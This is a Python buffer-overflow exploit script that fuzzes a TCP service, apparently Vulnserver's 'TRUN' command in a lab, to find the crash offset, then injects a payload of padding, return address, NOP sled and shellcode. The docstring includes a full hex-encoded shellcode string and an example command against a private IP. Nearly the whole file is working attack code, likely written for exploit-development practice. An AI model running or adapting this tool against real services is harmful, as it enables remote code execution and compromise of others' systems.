#!/usr/bin/python3
'''
EXAMPLE usage of Shell code injection

All in HEX:
offset + vulnerable_address + NOP + shell_code 

python3 bofer.py -x 'TRUN /.:/' -n 2003 -c
'xxxx62909090909090909090909090909090909090909090909090909090909090dbceba2139a92ed97424f45e31c9b15231561783eefc03772a4bdb8ba4092473356eac9604aecad3371e98b1bbd5cc214f9bd846f8163f69f90b03e8795650ca4099a50b84c444595d82fb4deadec7e6a0cf4f1b70f17e8a0aa8a02ddec0e83503eca3cef79a3506c6639967e691e3a0c14996d831f7a11f4b2327bbeba09f670d6479ec01c10daa05d4c2c1325de505b325c2819ffe6b90455093c2250d3189c85a48d084af61ea54b8f2996667a935cbe077c22cdbc05cd3e4307510b060edb1b9eaed3e6cbcbd90df7d6d51b015675eef0688b498ad735f6799439b0fd8b3b2935555de3b30ce77a51984e62ab4e129a03b16e741310490a10c7637bdba1edb2c21de924cfe89f3a3f75fee9aa17df37b89c528b814c4bd8432d67b047f82d353297c920d9bd64ce175be09c945b815043024a7f1055b0896812474066dff3c268cd548cf09bcf092a96b36ab2999c74831e8c215f501bf0690256c26b1' inject 192.168.56.6 9999


'''


import sys, socket
from time import sleep
import argparse

parser = argparse.ArgumentParser()

#mode: spike, fuzz, inject
#spike: increase buffer rapidly to prove the input is vulnerable
#fuzz: increase buffer gradually with smaller steps to get more precise BoF location
#inject: inject exact amount to exactly locate the EIP or overwrite EIP

parser.add_argument('bofMode', type=str, help='Enter BoF mode: spike, fuzz, inject')
parser.add_argument('targetIP', type=str)
parser.add_argument('targetPort', type=int)
parser.add_argument('-s','--step', default=100, type=int)
parser.add_argument('-x','--suffix', default='', type=str)
parser.add_argument('-n','--prefill_num', default=0, type=int)
parser.add_argument('-a','--prefill_ascii', default='', type=str)
parser.add_argument('-b','--useBadChars', default=0, type=int, help="1: place bad characters after postfix")
parser.add_argument('-c','--ShellCode', default='', type=str, help="Input as is. Example: \"AA BB CC\"")

#postfix usually includes confirmation code or shell code

args = parser.parse_args()

mode = args.bofMode
target_ip = args.targetIP
target_port = args.targetPort
step = args.step
suffix = bytearray(args.suffix, encoding ='ascii')
prefill_num = args.prefill_num
prefill_ascii = bytearray(args.prefill_ascii, encoding ='ascii')
useBadChars = args.useBadChars


package = b'A'*step

if mode == 'spike':
    mult = 1000
else:
    mult = 1


prefill = b'A' * prefill_num
#the smaller the step, the higher is accuracy
buffer = suffix + prefill
suf_size = len(suffix)

print("Size of suffix: %d" % suf_size)
print("Size of prefill: %d" % len(prefill))

#test connection to host
try:
    k = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    k.connect((target_ip,target_port))
except Exception as e:
    print(e)
    sys.exit(1)

k.close()

#spike and fuzz modes


while (True and  (mode != "inject" )):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target_ip,target_port))

        #send information as bytes
        s.sendall(buffer)
        s.close()
        
        sleep(1)
        buffer = buffer + package * mult
        print("Server alive. Total payload size = %d" % len(buffer)) 

    except KeyboardInterrupt:
        print("Operation aborted. Exiting...")
        sys.exit()

    except:
        print("Overflow at  %d bytes including suffix of %d bytes." % len(buffer), len(suffix))
        sys.exit(1)

#injection mode

if mode != "inject":
    sys.exit(1)

BadChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
        b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
        b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
        b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
        b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
        b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
        b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
        b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
        b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

if not useBadChars:
    BadChars =b""

shellcode = bytearray.fromhex(args.ShellCode)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

s.sendall(suffix + prefill + prefill_ascii + BadChars + shellcode)
s.close()
